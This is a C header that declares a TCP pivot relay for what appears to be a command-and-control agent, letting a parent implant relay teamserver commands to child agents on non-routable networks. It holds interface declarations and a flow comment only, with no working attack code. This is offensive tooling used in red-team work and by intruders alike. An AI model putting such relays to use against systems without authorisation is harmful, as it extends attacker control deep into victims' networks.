#ifndef PIVOT_H
#define PIVOT_H

#include "types.h"
#include "msgpack.h"
#include <stdint.h>

/// TCP pivot relay -- allows parent agent to relay traffic to/from child agents
/// on non-routable networks. Linux-only, TCP transport.
///
/// Flow:
///   1. Teamserver sends COMMAND_LINK(address, port) to parent agent
///   2. Parent connects to child via TCP, reads handshake (4B watermark + beat)
///   3. Parent returns {type, watermark, beat} to teamserver
///   4. Teamserver sends COMMAND_PIVOT_EXEC(pivotId, data) for relay to child
///   5. Parent polls child sockets in process_pivots(), relays data back
///   6. Teamserver sends COMMAND_UNLINK(pivotId) to tear down

#define MAX_PIVOTS  32

typedef struct {
    uint32_t id;      /* pivot ID = task ID from COMMAND_LINK */
    int      fd;      /* TCP socket to child agent */
    int      active;  /* 1 = live, 0 = free slot */
} pivot_entry_t;

typedef struct {
    pivot_entry_t entries[MAX_PIVOTS];
    int           count;
} pivot_context_t;

/// Initialize pivot context
void pivots_init(pivot_context_t *ctx);

/// Link: connect to child agent at address:port, read handshake,
/// store pivot entry. Writes response data to `response`.
/// Returns 0 on success, -1 on error.
int pivot_link_tcp(pivot_context_t *ctx, uint32_t task_id,
                   const char *address, int port,
                   mp_writer_t *response);

/// Unlink: close a pivot by ID. Writes response to `response`.
/// Returns 0 on success, -1 if not found.
int pivot_unlink(pivot_context_t *ctx, uint32_t pivot_id,
                 mp_writer_t *response);

/// Write data to a pivot's child agent (relay from teamserver).
/// Used for COMMAND_PIVOT_EXEC from server→child direction.
int pivot_write(pivot_context_t *ctx, uint32_t pivot_id,
                const uint8_t *data, uint32_t data_len);

/// Poll all active pivots for incoming data from child agents.
/// Appends relay response objects to `objects_writer` (msgpack array context).
/// Returns the number of pivot data objects appended.
int process_pivots(pivot_context_t *ctx, mp_writer_t *objects_writer);

/// Global pivot context (defined in pivot.c)
extern pivot_context_t g_pivot_ctx;

#endif /* PIVOT_H */
